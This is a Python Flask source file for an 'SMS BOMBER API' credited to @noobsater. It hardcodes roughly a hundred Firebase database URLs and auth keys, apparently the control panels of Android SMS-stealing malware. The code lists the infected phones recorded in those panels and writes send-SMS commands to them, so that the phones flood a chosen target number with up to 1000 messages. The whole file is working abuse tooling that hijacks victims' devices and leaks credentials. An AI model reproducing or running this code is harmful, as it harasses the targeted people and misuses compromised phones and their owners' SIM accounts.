#!/usr/bin/env python3
"""
SMS BOMBER API - Render.com Deployment
ALL 127+ Firebase Databases - 100 SMS per device limit
Developer: @noobsater
"""

from flask import Flask, request, jsonify
import requests
import json
import time
import random
import re
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import os

app = Flask(__name__)

# ============================================================
# ===== ALL FIREBASE CONFIGURATIONS (127+) =====
# ============================================================

FIREBASE_CONFIGS = [
    # ===== ASURPAPA wale (25) =====
    {"name": "sex-panel", "url": "https://sex-panel-default-rtdb.firebaseio.com", "auth": "ASURPAPA"},
    {"name": "ritesh0001", "url": "https://ritesh0001-ea582-default-rtdb.firebaseio.com", "auth": "ASURPAPA"},
    {"name": "tika3", "url": "https://tika3-a400c-default-rtdb.firebaseio.com", "auth": "ASURPAPA"},
    {"name": "admin-panel", "url": "https://admin-panel-b2935-default-rtdb.firebaseio.com", "auth": "ASURPAPA"},
    {"name": "aug1", "url": "https://aug1-ea7c9-default-rtdb.firebaseio.com", "auth": "ASURPAPA"},
    {"name": "xxx-kumar", "url": "https://xxx-kumar-default-rtdb.firebaseio.com", "auth": "ASURPAPA"},
    {"name": "money", "url": "https://money-ace2c-default-rtdb.firebaseio.com", "auth": "ASURPAPA"},
    {"name": "mpariwhan", "url": "https://mpariwhan-default-rtdb.firebaseio.com", "auth": "ASURPAPA"},
    {"name": "jama", "url": "https://jama-d7d04-default-rtdb.firebaseio.com", "auth": "ASURPAPA"},
    {"name": "abhiyogi", "url": "https://abhiyogi-8b07e-default-rtdb.firebaseio.com", "auth": "ASURPAPA"},
    {"name": "kingu", "url": "https://kingu-2dbb9-default-rtdb.firebaseio.com", "auth": "ASURPAPA"},
    {"name": "chudgy", "url": "https://chudgy-1cdca-default-rtdb.firebaseio.com", "auth": "ASURPAPA"},
    {"name": "nitu", "url": "https://nitu-2f326-default-rtdb.firebaseio.com", "auth": "ASURPAPA"},
    {"name": "astra", "url": "https://astra-b23a1-default-rtdb.firebaseio.com", "auth": "ASURPAPA"},
    {"name": "dyydd", "url": "https://dyydd-c53c8-default-rtdb.firebaseio.com", "auth": "ASURPAPA"},
    {"name": "suto3", "url": "https://suto3-1b0bc-default-rtdb.firebaseio.com", "auth": "ASURPAPA"},
    {"name": "rahul", "url": "https://rahul-fd65f-default-rtdb.firebaseio.com", "auth": "ASURPAPA"},
    {"name": "ajitttt", "url": "https://ajitttt-17678-default-rtdb.firebaseio.com", "auth": "ASURPAPA"},
    {"name": "vicky", "url": "https://vicky-218c8-default-rtdb.asia-southeast1.firebasedatabase.app", "auth": "ASURPAPA"},
    {"name": "dogla", "url": "https://dogla-de225-default-rtdb.firebaseio.com", "auth": "ASURPAPA"},
    {"name": "axisjames", "url": "https://axisjames-default-rtdb.firebaseio.com", "auth": "ASURPAPA"},
    {"name": "colana", "url": "https://colana-84ce2-default-rtdb.firebaseio.com", "auth": "ASURPAPA"},
    {"name": "amirrr", "url": "https://amirrr-8a463-default-rtdb.firebaseio.com", "auth": "ASURPAPA"},
    {"name": "acchahi", "url": "https://acchahi-default-rtdb.firebaseio.com", "auth": "ASURPAPA"},
    {"name": "ankur", "url": "https://ankur-2511f-default-rtdb.firebaseio.com", "auth": "ASURPAPA"},
    
    # ===== Different Keys wale (25) =====
    {"name": "ashu-415kumar", "url": "https://ashu-415kumar-default-rtdb.firebaseio.com", "auth": "1"},
    {"name": "adsf", "url": "https://adsf-8b4e8-default-rtdb.asia-southeast1.firebasedatabase.app", "auth": "1"},
    {"name": "surya", "url": "https://surya-917b9-default-rtdb.firebaseio.com", "auth": "Vo"},
    {"name": "simadevi", "url": "https://simadevi-f42fc-default-rtdb.firebaseio.com", "auth": "AIzaSyBkccFcYJ-FfClxHMztRAyropULYvxKsW0"},
    {"name": "runjun-master", "url": "https://runjun-master-panel-default-rtdb.firebaseio.com", "auth": "AIzaSyBawSxrwOxhTzKzCv20-LkcoxK7n6y4msc"},
    {"name": "risho", "url": "https://risho-d4c66-default-rtdb.firebaseio.com", "auth": "Kiruu"},
    {"name": "jpicku", "url": "https://jpicku-47790-default-rtdb.firebaseio.com", "auth": "Akku"},
    {"name": "vibe", "url": "https://vibe-d238e-default-rtdb.firebaseio.com", "auth": "Vv"},
    {"name": "gandhi-ji", "url": "https://gandhi-ji-1-default-rtdb.asia-southeast1.firebasedatabase.app", "auth": "ERA"},
    {"name": "joginder", "url": "https://joginder-jhatkila-default-rtdb.asia-southeast1.firebasedatabase.app", "auth": "ERA"},
    {"name": "expert", "url": "https://expert-5e1a0-default-rtdb.firebaseio.com", "auth": "AIzaSyCC2Z_P-ZflEnMjt_ZR2C1h12-4h7lK00U"},
    {"name": "admin-panel-clinet", "url": "https://admin-panel-clinet-default-rtdb.firebaseio.com", "auth": "AIzaSyBJ0nywtb7wdAxCI1sBuPFDnTYCfxtCdJE"},
    {"name": "sakshi1", "url": "https://sakshi1-dfc80-default-rtdb.firebaseio.com", "auth": "AIzaSyADOsvjQqhK-B4DyYG113yChcAkG3t9-A0"},
    {"name": "okayo", "url": "https://okayo-f1a54-default-rtdb.firebaseio.com", "auth": "AIzaSyAlSEtqs0Hfwa7tMcdvDnw45QPcURIJQwY"},
    {"name": "momo", "url": "https://momo-fae14-default-rtdb.firebaseio.com", "auth": "AIzaSyD2KGHVVHq5jK6RuG5r8GbMUEEwAQfvFWo"},
    {"name": "photo", "url": "https://photo-b3023-default-rtdb.firebaseio.com", "auth": "AIzaSyBHFl6n-IrUFniKXjp81KurA3CE6S3TA2w"},
    {"name": "koya", "url": "https://koya-7acd9-default-rtdb.firebaseio.com", "auth": "AIzaSyBHFl6n-IrUFniKXjp81KurA3CE6S3TA2w"},
    {"name": "radhe", "url": "https://radhe-d31aa-default-rtdb.firebaseio.com", "auth": "AIzaSyBHFl6n-IrUFniKXjp81KurA3CE6S3TA2w"},
    {"name": "puja-app", "url": "https://puja-app-50785-default-rtdb.firebaseio.com", "auth": "AIzaSyBHFl6n-IrUFniKXjp81KurA3CE6S3TA2w"},
    {"name": "singhaana", "url": "https://singhaana-6f199-default-rtdb.firebaseio.com", "auth": "AIzaSyD-1Gvt2cmr0mv1xoK4V9vtjVMXyJVLAvg"},
    {"name": "hdfc", "url": "https://hdfc-561e8-default-rtdb.firebaseio.com", "auth": "AIzaSyCEuzyZmyChhdpEFmzL8P0LiE6PTqEEZi0"},
    {"name": "hacker-panel", "url": "https://hacker-panel-dcc53-default-rtdb.firebaseio.com", "auth": "AIzaSyDOWLDUN9fU-aKfgK4Su-ImbLO3VS_a2KI"},
    {"name": "jaduopop", "url": "https://jaduopop-a9a12-default-rtdb.firebaseio.com", "auth": "AIzaSyCfw-XX9NgbsUVCOP_GbxETXIY4AaH5b58"},
    {"name": "niggasionic", "url": "https://niggasionic-default-rtdb.asia-southeast1.firebasedatabase.app", "auth": "Hah"},
    {"name": "burchanno", "url": "https://burchanno-default-rtdb.asia-southeast1.firebasedatabase.app", "auth": "Pp"},
    
    # ===== URL = Key wale (75+) =====
    {"name": "hood", "url": "https://hood-4ba1e-default-rtdb.firebaseio.com", "auth": "https://hood-4ba1e-default-rtdb.firebaseio.com"},
    {"name": "lucifer", "url": "https://lucifer-spreader-default-rtdb.firebaseio.com", "auth": "https://lucifer-spreader-default-rtdb.firebaseio.com"},
    {"name": "totla-axis", "url": "https://totla-axis-default-rtdb.firebaseio.com", "auth": "https://totla-axis-default-rtdb.firebaseio.com"},
    {"name": "rggggg", "url": "https://rgggggggggg-e2547-default-rtdb.firebaseio.com", "auth": "https://rgggggggggg-e2547-default-rtdb.firebaseio.com"},
    {"name": "bulbul", "url": "https://bulbul8084-9a5df-default-rtdb.firebaseio.com", "auth": "https://bulbul8084-9a5df-default-rtdb.firebaseio.com"},
    {"name": "systumm", "url": "https://systumm-c8526-default-rtdb.firebaseio.com", "auth": "https://systumm-c8526-default-rtdb.firebaseio.com"},
    {"name": "ravan", "url": "https://ravan-98ef1-default-rtdb.firebaseio.com", "auth": "https://ravan-98ef1-default-rtdb.firebaseio.com"},
    {"name": "yellow-pannel", "url": "https://yellow-pannel-dadc7-default-rtdb.firebaseio.com", "auth": "https://yellow-pannel-dadc7-default-rtdb.firebaseio.com"},
    {"name": "pmkishan", "url": "https://pmkishan8-6b70f-default-rtdb.firebaseio.com", "auth": "https://pmkishan8-6b70f-default-rtdb.firebaseio.com"},
    {"name": "no-admin", "url": "https://no-admin-e0a30-default-rtdb.firebaseio.com", "auth": "https://no-admin-e0a30-default-rtdb.firebaseio.com"},
    {"name": "sexypayload", "url": "https://sexypayload-default-rtdb.firebaseio.com", "auth": "https://sexypayload-default-rtdb.firebaseio.com"},
    {"name": "love", "url": "https://love-13ffc-default-rtdb.firebaseio.com", "auth": "https://love-13ffc-default-rtdb.firebaseio.com"},
    {"name": "deepak", "url": "https://deepak-c22e3-default-rtdb.firebaseio.com", "auth": "https://deepak-c22e3-default-rtdb.firebaseio.com"},
    {"name": "takul", "url": "https://takul-cf410-default-rtdb.firebaseio.com", "auth": "https://takul-cf410-default-rtdb.firebaseio.com"},
    {"name": "rto-april", "url": "https://rto-02-april06-default-rtdb.firebaseio.com", "auth": "https://rto-02-april06-default-rtdb.firebaseio.com"},
    {"name": "projectpksk", "url": "https://projectpksk05102025-default-rtdb.firebaseio.com", "auth": "https://projectpksk05102025-default-rtdb.firebaseio.com"},
    {"name": "rajkumar", "url": "https://rajkumar-b6cbe-default-rtdb.firebaseio.com", "auth": "https://rajkumar-b6cbe-default-rtdb.firebaseio.com"},
    {"name": "rtoo", "url": "https://rtoo-6c8e6-default-rtdb.firebaseio.com", "auth": "https://rtoo-6c8e6-default-rtdb.firebaseio.com"},
    {"name": "upandar", "url": "https://upandar-bb51e-default-rtdb.firebaseio.com", "auth": "https://upandar-bb51e-default-rtdb.firebaseio.com"},
    {"name": "rolex-carder", "url": "https://rolex-carder-default-rtdb.firebaseio.com", "auth": "https://rolex-carder-default-rtdb.firebaseio.com"},
    {"name": "rettiugh", "url": "https://rettiugh-default-rtdb.firebaseio.com", "auth": "https://rettiugh-default-rtdb.firebaseio.com"},
    {"name": "business-apps", "url": "https://business-apps-ba1-8d27c-default-rtdb.firebaseio.com", "auth": "https://business-apps-ba1-8d27c-default-rtdb.firebaseio.com"},
    {"name": "jeet-op", "url": "https://jeet-op-default-rtdb.firebaseio.com", "auth": "https://jeet-op-default-rtdb.firebaseio.com"},
    {"name": "vvvvv", "url": "https://vvvvv-b5eae-default-rtdb.firebaseio.com", "auth": "https://vvvvv-b5eae-default-rtdb.firebaseio.com"},
    {"name": "jaanubaby", "url": "https://jaanubaby-f7b34-default-rtdb.firebaseio.com", "auth": "https://jaanubaby-f7b34-default-rtdb.firebaseio.com"},
    {"name": "jj-gambler", "url": "https://jj-gambler-default-rtdb.firebaseio.com", "auth": "https://jj-gambler-default-rtdb.firebaseio.com"},
    {"name": "suman-penal", "url": "https://suman-penal-default-rtdb.firebaseio.com", "auth": "https://suman-penal-default-rtdb.firebaseio.com"},
    {"name": "tuuui", "url": "https://tuuui-60b15-default-rtdb.firebaseio.com", "auth": "https://tuuui-60b15-default-rtdb.firebaseio.com"},
    {"name": "admin-sonu", "url": "https://admin-sonu-8a567-default-rtdb.firebaseio.com", "auth": "https://admin-sonu-8a567-default-rtdb.firebaseio.com"},
    {"name": "rohet", "url": "https://rohet10-8919f-default-rtdb.firebaseio.com", "auth": "https://rohet10-8919f-default-rtdb.firebaseio.com"},
    {"name": "zeni", "url": "https://zeni-ae60b-default-rtdb.firebaseio.com", "auth": "https://zeni-ae60b-default-rtdb.firebaseio.com"},
    {"name": "maxxx-randi", "url": "https://maxxx-randi-default-rtdb.firebaseio.com", "auth": "https://maxxx-randi-default-rtdb.firebaseio.com"},
    {"name": "gulabi-fuddi", "url": "https://gulabi-fuddi-default-rtdb.firebaseio.com", "auth": "https://gulabi-fuddi-default-rtdb.firebaseio.com"},
    {"name": "comkingdir", "url": "https://comkingdir-default-rtdb.firebaseio.com", "auth": "https://comkingdir-default-rtdb.firebaseio.com"},
    {"name": "tracegod", "url": "https://tracegod-168d5-default-rtdb.firebaseio.com", "auth": "https://tracegod-168d5-default-rtdb.firebaseio.com"},
    {"name": "uc-op", "url": "https://uc-op-ca3d2-default-rtdb.firebaseio.com", "auth": "https://uc-op-ca3d2-default-rtdb.firebaseio.com"},
    {"name": "smsforward", "url": "https://smsforward-b2198.firebaseio.com", "auth": "https://smsforward-b2198.firebaseio.com"},
    {"name": "hdrbf", "url": "https://hdrbf-485ec-default-rtdb.firebaseio.com", "auth": "https://hdrbf-485ec-default-rtdb.firebaseio.com"},
    {"name": "bunty", "url": "https://bunty-51bcc-default-rtdb.firebaseio.com", "auth": "https://bunty-51bcc-default-rtdb.firebaseio.com"},
    {"name": "vishal-x", "url": "https://vishal-x-aravat-default-rtdb.firebaseio.com", "auth": "https://vishal-x-aravat-default-rtdb.firebaseio.com"},
    {"name": "admin-cliwny", "url": "https://admin-cliwny-default-rtdb.firebaseio.com", "auth": "https://admin-cliwny-default-rtdb.firebaseio.com"},
    {"name": "danish", "url": "https://danish-77fe3-default-rtdb.firebaseio.com", "auth": "https://danish-77fe3-default-rtdb.firebaseio.com"},
    {"name": "master-admin", "url": "https://master-admin-6c650-default-rtdb.firebaseio.com", "auth": "https://master-admin-6c650-default-rtdb.firebaseio.com"},
    {"name": "panel-op", "url": "https://panel-op-feb4d-default-rtdb.firebaseio.com", "auth": "https://panel-op-feb4d-default-rtdb.firebaseio.com"},
    {"name": "your-project", "url": "https://your-project-id-default-rtdb.firebaseio.com", "auth": "https://your-project-id-default-rtdb.firebaseio.com"},
    {"name": "pm23", "url": "https://pm23-98f32-default-rtdb.firebaseio.com", "auth": "https://pm23-98f32-default-rtdb.firebaseio.com"},
    {"name": "iiiii", "url": "https://iiiii-ade0e-default-rtdb.firebaseio.com", "auth": "https://iiiii-ade0e-default-rtdb.firebaseio.com"},
    {"name": "pint", "url": "https://pint-f465b-default-rtdb.firebaseio.com", "auth": "https://pint-f465b-default-rtdb.firebaseio.com"},
    {"name": "admin-panel-bfcdc", "url": "https://admin-panel-bfcdc-default-rtdb.firebaseio.com", "auth": "https://admin-panel-bfcdc-default-rtdb.firebaseio.com"},
    {"name": "callmebitch", "url": "https://callmebitchfumckyou-default-rtdb.firebaseio.com", "auth": "https://callmebitchfumckyou-default-rtdb.firebaseio.com"},
    {"name": "demonrat", "url": "https://demonrat-aa782-default-rtdb.firebaseio.com", "auth": "https://demonrat-aa782-default-rtdb.firebaseio.com"},
    {"name": "access20", "url": "https://access20-3fc38-default-rtdb.firebaseio.com", "auth": "https://access20-3fc38-default-rtdb.firebaseio.com"},
    {"name": "article", "url": "https://article-efd36-default-rtdb.firebaseio.com", "auth": "https://article-efd36-default-rtdb.firebaseio.com"},
    {"name": "rajababukvirat", "url": "https://rajababukvirat-default-rtdb.firebaseio.com", "auth": "https://rajababukvirat-default-rtdb.firebaseio.com"},
    {"name": "axis-suraj", "url": "https://axis-suraj-tele-apcd001-default-rtdb.firebaseio.com", "auth": "https://axis-suraj-tele-apcd001-default-rtdb.firebaseio.com"},
    {"name": "sandycall", "url": "https://sandycall-18b15-default-rtdb.firebaseio.com", "auth": "https://sandycall-18b15-default-rtdb.firebaseio.com"},
    {"name": "suihd", "url": "https://suihd-default-rtdb.firebaseio.com", "auth": "https://suihd-default-rtdb.firebaseio.com"},
    {"name": "harrwp", "url": "https://harrwp-6be36-default-rtdb.firebaseio.com", "auth": "https://harrwp-6be36-default-rtdb.firebaseio.com"},
    {"name": "test-firebase", "url": "https://test-firebase.firebaseio.com", "auth": "https://test-firebase.firebaseio.com"},
    {"name": "adutapp", "url": "https://adutappbylucy-default-rtdb.firebaseio.com", "auth": "https://adutappbylucy-default-rtdb.firebaseio.com"},
    {"name": "download", "url": "https://download-b7393-default-rtdb.firebaseio.com", "auth": "https://download-b7393-default-rtdb.firebaseio.com"},
    {"name": "bobnewloda", "url": "https://bobnewloda-default-rtdb.firebaseio.com", "auth": "https://bobnewloda-default-rtdb.firebaseio.com"},
    {"name": "artikumari", "url": "https://artikumari-abc97-default-rtdb.firebaseio.com", "auth": "https://artikumari-abc97-default-rtdb.firebaseio.com"},
    {"name": "seuihd", "url": "https://seuihd-default-rtdb.firebaseio.com", "auth": "https://seuihd-default-rtdb.firebaseio.com"},
    {"name": "gigapaid", "url": "https://gigapaid-39e9c-default-rtdb.firebaseio.com", "auth": "https://gigapaid-39e9c-default-rtdb.firebaseio.com"},
    {"name": "angeladmin", "url": "https://angeladmin-9dedc-default-rtdb.firebaseio.com", "auth": "https://angeladmin-9dedc-default-rtdb.firebaseio.com"},
    {"name": "fir-new", "url": "https://fir-new-fe8b8-default-rtdb.firebaseio.com", "auth": "https://fir-new-fe8b8-default-rtdb.firebaseio.com"},
    {"name": "priysnshuu", "url": "https://priysnshuu-default-rtdb.firebaseio.com", "auth": "https://priysnshuu-default-rtdb.firebaseio.com"},
    {"name": "haab", "url": "https://haab-b3370-default-rtdb.firebaseio.com", "auth": "https://haab-b3370-default-rtdb.firebaseio.com"},
    {"name": "ueuwuw", "url": "https://ueuwuw-default-rtdb.firebaseio.com", "auth": "https://ueuwuw-default-rtdb.firebaseio.com"},
    {"name": "test", "url": "https://test.firebaseio.com", "auth": "https://test.firebaseio.com"},
    {"name": "jkhsadfhjk", "url": "https://jkhsadfhjk-default-rtdb.firebaseio.com", "auth": "https://jkhsadfhjk-default-rtdb.firebaseio.com"},
    {"name": "sonic", "url": "https://sonic-d5c1a-default-rtdb.firebaseio.com", "auth": "https://sonic-d5c1a-default-rtdb.firebaseio.com"},
    {"name": "jonisins", "url": "https://jonisins-52271-default-rtdb.firebaseio.com", "auth": "https://jonisins-52271-default-rtdb.firebaseio.com"},
    {"name": "dusman", "url": "https://dusman-abf8b-default-rtdb.firebaseio.com", "auth": "https://dusman-abf8b-default-rtdb.firebaseio.com"},
    {"name": "riyy", "url": "https://riyy-e012e-default-rtdb.firebaseio.com", "auth": "https://riyy-e012e-default-rtdb.firebaseio.com"},
    {"name": "xkpz", "url": "https://xkpz-f937a-default-rtdb.firebaseio.com", "auth": "https://xkpz-f937a-default-rtdb.firebaseio.com"},
    
    # ===== Extra (Naye jo tune diye) =====
    {"name": "oyilo", "url": "https://oyilo-5cada-default-rtdb.firebaseio.com", "auth": "https://oyilo-5cada-default-rtdb.firebaseio.com"},
    {"name": "rahul-fd65f", "url": "https://rahul-fd65f-default-rtdb.firebaseio.com", "auth": "V"},
    {"name": "admin-no-43", "url": "https://admin-no-43-default-rtdb.firebaseio.com", "auth": "V"},
    {"name": "mannu2", "url": "https://mannu2-edea3-default-rtdb.firebaseio.com", "auth": "1"},
    {"name": "vamprandi", "url": "https://vamprandi-default-rtdb.firebaseio.com", "auth": "T8dd7"},
    {"name": "rto-31b04", "url": "https://rto-31b04-default-rtdb.firebaseio.com", "auth": "https://rto-31b04-default-rtdb.firebaseio.com"},
    {"name": "jhatu-kismta", "url": "https://jhatu-kismta-default-rtdb.firebaseio.com", "auth": "jhatu-kismta"},
    {"name": "pm13", "url": "https://pm13-3f80f-default-rtdb.asia-southeast1.firebasedatabase.app", "auth": "pm13-3f80f"},
]

# ============================================================
# ===== CONFIGURATION =====
# ============================================================

MAX_SMS_PER_DEVICE = 100
device_usage = {}

# ============================================================

def safe_int(value):
    """Safely convert any value to integer"""
    if not value:
        return 0
    if isinstance(value, int):
        return value
    if isinstance(value, str):
        cleaned = re.sub(r'[^0-9]', '', value)
        try:
            return int(cleaned) if cleaned else 0
        except:
            return 0
    return 0

def is_online(info):
    """Check if device is online"""
    if info.get('status') == True:
        return True
    battery = info.get('battery')
    if battery:
        batt_int = safe_int(battery)
        if batt_int > 0:
            return True
    return False

def has_sim(info):
    """Check if device has SIM"""
    return bool(info.get('sim1') or info.get('sim') or info.get('phone') or info.get('number'))

def get_today():
    return datetime.now().strftime("%Y-%m-%d")

def can_send(device_id):
    key = f"{device_id}_{get_today()}"
    return device_usage.get(key, 0) < MAX_SMS_PER_DEVICE

def increment_usage(device_id):
    key = f"{device_id}_{get_today()}"
    device_usage[key] = device_usage.get(key, 0) + 1

# ============================================================

def fetch_devices(config):
    """Fetch devices from a single Firebase"""
    url = f"{config['url']}/clients.json?auth={config['auth']}"
    try:
        response = requests.get(url, timeout=10)
        if response.status_code != 200:
            return []
        data = response.json()
        if not data:
            return []
        devices = []
        for client_id, info in data.items():
            online = is_online(info)
            if online and has_sim(info):
                devices.append({
                    "id": client_id,
                    "firebase": config['name'],
                    "config": config,
                    "sim": info.get('sim1') or info.get('sim') or info.get('phone') or info.get('number')
                })
        return devices
    except:
        return []

def fetch_all_devices():
    """Fetch devices from all Firebase databases"""
    all_devices = []
    for config in FIREBASE_CONFIGS:
        devices = fetch_devices(config)
        all_devices.extend(devices)
    return all_devices

def send_sms(config, client_id, to_number, message):
    """Send SMS using a device"""
    url = f"{config['url']}/clients/{client_id}/webhookEvent/sendSms.json?auth={config['auth']}"
    payload = {
        "from": random.randint(1, 99),
        "to": str(to_number),
        "message": str(message),
        "isSended": False,
        "timestamp": int(time.time() * 1000)
    }
    try:
        response = requests.put(url, json=payload, timeout=10)
        if response.status_code in [200, 201, 204]:
            increment_usage(client_id)
            return True
        return False
    except:
        return False

# ============================================================

@app.route('/')
def home():
    return f"""
╔═══════════════════════════════════════════════════════════╗
║     🔥 SMS BOMBER API - {len(FIREBASE_CONFIGS)} FIREBASE DBs    ║
╠═══════════════════════════════════════════════════════════╣
║                                                         ║
║  📌 USAGE:                                             ║
║                                                         ║
║  GET /send?number=9999999999&msg=Hello&count=10       ║
║                                                         ║
║  📊 FEATURES:                                          ║
║                                                         ║
║  ✅ {len(FIREBASE_CONFIGS)} Firebase Databases           ║
║  ✅ {MAX_SMS_PER_DEVICE} SMS per device per day        ║
║  ✅ Auto-rotate devices                                ║
║                                                         ║
╠═══════════════════════════════════════════════════════════╣
║  👨‍💻 Developer: @noobsater                              ║
║  📢 Channel: t.me/noob11001                            ║
║  📢 Channel: t.me/noobsterrr                           ║
╚═══════════════════════════════════════════════════════════╝
    """

@app.route('/status')
def status_api():
    all_devices = fetch_all_devices()
    return jsonify({
        "success": True,
        "timestamp": datetime.now().isoformat(),
        "total_devices": len(all_devices),
        "firebases": len(FIREBASE_CONFIGS),
        "limit_per_device": MAX_SMS_PER_DEVICE,
        "developer": "@noobsater",
        "channel": "t.me/noob11001"
    })

@app.route('/send')
def send_sms_api():
    number = request.args.get('number')
    message = request.args.get('msg')
    count = int(request.args.get('count') or 1)
    
    if not number or not message:
        return jsonify({"success": False, "error": "Number and message required!"}), 400
    
    max_count = min(count, 1000)
    all_devices = fetch_all_devices()
    
    if not all_devices:
        return jsonify({
            "success": False,
            "error": "No devices with SIM found!",
            "firebases": len(FIREBASE_CONFIGS)
        }), 404
    
    sent, failed = 0, 0
    
    def worker(device):
        success = send_sms(device['config'], device['id'], number, message)
        return success
    
    with ThreadPoolExecutor(max_workers=10) as ex:
        for success in ex.map(worker, all_devices[:max_count]):
            if success:
                sent += 1
            else:
                failed += 1
    
    return jsonify({
        "success": sent > 0,
        "target": number,
        "message": message,
        "requested": max_count,
        "sent": sent,
        "failed": failed,
        "total_devices": len(all_devices),
        "firebases": len(FIREBASE_CONFIGS),
        "developer": "@noobsater",
        "channel": "t.me/noob11001"
    })

@app.route('/reset')
def reset_api():
    global device_usage
    device_usage = {}
    return jsonify({"success": True, "message": "Reset done!"})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
